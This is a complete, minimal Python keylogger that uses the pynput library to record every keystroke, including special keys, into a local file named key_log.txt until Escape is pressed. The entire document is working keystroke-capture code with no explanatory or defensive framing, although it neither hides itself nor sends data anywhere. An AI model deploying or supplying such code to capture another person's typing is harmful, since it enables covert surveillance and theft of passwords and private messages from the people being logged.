from pynput import keyboard

# File to save the logged keys
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            # Special keys (e.g., space, enter, shift)
            f.write(f"{key}")

def on_release(key):
    # Stop listener by pressing the escape key
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
